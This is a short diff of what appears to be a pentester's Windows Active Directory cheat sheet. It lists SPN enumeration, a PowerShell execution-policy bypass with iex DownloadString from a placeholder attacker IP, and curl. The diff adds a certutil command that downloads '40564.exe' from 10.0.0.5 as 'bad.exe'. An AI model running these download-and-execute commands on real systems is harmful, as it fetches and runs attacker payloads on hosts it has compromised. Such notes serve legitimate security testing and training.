@@ -20,6 +20,7 @@ setspn -T medin -Q ​ */*  //to extract all accouint in SPN, when we have a nor
       powershell -ep bypass;
       iex​(New-Object Net.WebClient).DownloadString('https://YOUR_IP/xx')
       or curl http://xxx/xx -o xx
+      or certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
   >net accounts    /login policy
   >Write-Output "${env:COMPUTERNAME}"  //get computername
   //if the display of shell is not recgnized,
